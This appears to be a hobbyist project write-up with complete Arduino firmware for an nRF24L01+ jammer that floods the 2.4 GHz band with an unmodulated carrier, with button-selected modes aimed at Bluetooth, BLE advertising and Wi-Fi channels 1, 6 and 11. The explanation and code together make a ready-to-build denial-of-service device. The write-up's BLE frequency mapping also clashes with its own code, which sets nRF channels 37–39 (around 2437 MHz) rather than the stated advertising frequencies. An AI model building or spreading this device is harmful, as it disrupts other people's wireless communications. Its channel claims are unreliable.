01 — overview
What Was Built
an nrf24l01+ driven rf interference device running on arduino uno. the module is placed into startConstCarrier mode — emitting a raw unmodulated signal at max power rather than transmitting packets. by cycling through channels in the 2.4ghz ism band at 8mhz spi clock speed, it floods spectrum used by bluetooth, ble, and 2.4ghz wi-fi. a 16×2 i2c lcd displays the active mode and a single button on a2 cycles through four jam profiles. lcd only updates on press to avoid loop overhead between channel switches.

01
Shared Spectrum
bluetooth, ble, and 2.4ghz wi-fi all share the 2400–2483.5 mhz ism band — unlicensed, no coordination required. wi-fi occupies 22mhz-wide channels centered at fixed points. bluetooth classic frequency-hops across 79 channels at up to 1600 hops/sec. ble uses 40 channels with three fixed advertising channels (37, 38, 39) for discovery and pairing.
02
Carrier Wave Interference
startConstCarrier puts the nrf24 into a mode where it emits a continuous unmodulated rf tone at max power on a chosen channel — not a packet, just raw energy. any receiver on that frequency sees the jammer's signal as noise, raising the effective noise floor above the demodulation threshold. signal-to-noise drops, the link fails to decode.
03
Channel Hopping Speed
a single 1mhz carrier can't cover wi-fi's 22mhz channel or keep up with bluetooth's hopping. rapid channel cycling solves this — switching channels faster than targets can find a clean one. spi at 8mhz maximizes the raw rate of setChannel() calls. enough dwell time per channel degrades each link before the sweep moves on.
04
Why BLE Is Vulnerable
ble advertising channels are fixed: ch 37 = 2402mhz, ch 38 = 2426mhz, ch 39 = 2480mhz. they don't hop. a device must successfully transmit on all three to be discoverable. unrolled sequential writes to 37→38→39 with no loop overhead keeps each channel flooded long enough to block advertising packets. already-connected ble devices using afh are harder to disrupt.

/*
 * NRF24KXBJammer — khxngvng
 * 2.4ghz rf interference via nRF24L01+ continuous carrier
 */
#include "RF24.h"
#include <SPI.h>
#include <LiquidCrystal_I2C.h>

LiquidCrystal_I2C lcd(0x27, 16, 2);
RF24 radio(9, 10);  // ce, csn

int          jamMode    = 0;   // 0=full 1=ble 2=wifi 3=credit
const int    buttonPin = A2;
byte         i          = 45;  // initial channel
unsigned int flag       = 0;   // reserved / unused

void setup() {
  Serial.begin(115200);
  SPI.setClockDivider(SPI_CLOCK_DIV2);  // 8mhz spi

  lcd.init();
  lcd.backlight();
  pinMode(buttonPin, INPUT_PULLUP);
  lcd.setCursor(0, 0); lcd.print("nRF24 JAMMER");
  lcd.setCursor(0, 1); lcd.print("     by KHXNGVNG");

  if (radio.begin()) {
    delay(20);
    Serial.println("radio init!!!");
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, i);
  } else {
    Serial.println("failed to init radio!!");
  }
}

void loop() {

  // button: cycle mode ─────────────────────────────────────
  if (digitalRead(buttonPin) == LOW) {
    if (++jamMode > 3) jamMode = 0;
    lcd.clear();
    lcd.setCursor(0, 0);
    if      (jamMode == 0) { lcd.print("MODE : FULL");    lcd.setCursor(0,1); lcd.print("CH : 0-79 + BLE"); }
    else if (jamMode == 1) { lcd.print("MODE : BLE ONLY"); lcd.setCursor(0,1); lcd.print("CH : 37, 38, 39"); }
    else if (jamMode == 2) { lcd.print("MODE : WIFI");    lcd.setCursor(0,1); lcd.print("CH : 1, 6, 11"); }
    else                   { lcd.print("nRF24 JAMMER");   lcd.setCursor(0,1); lcd.print("     by KHXNGVNG"); }
    delay(300);
  }

  // mode 0 : full sweep + ble unrolled ─────────────────────
  if (jamMode == 0) {
    for (byte c = 0; c < 79; c++) radio.setChannel(c);
    radio.setChannel(37);
    radio.setChannel(38);
    radio.setChannel(39);
  }
  // mode 1 : ble advertising channels only ─────────────────
  else if (jamMode == 1) {
    radio.setChannel(37);
    radio.setChannel(38);
    radio.setChannel(39);
  }
  // mode 2 : wi-fi ch 1/6/11 center frequencies ────────────
  else if (jamMode == 2) {
    radio.setChannel(12);  // 2412 mhz = wi-fi ch 1
    radio.setChannel(37);  // 2437 mhz = wi-fi ch 6
    radio.setChannel(62);  // 2462 mhz = wi-fi ch 11
  }
  // mode 3 : credit screen (same as full) ──────────────────
  else {
    for (byte c = 0; c < 79; c++) radio.setChannel(c);
    radio.setChannel(37);
    radio.setChannel(38);
    radio.setChannel(39);
  }
}
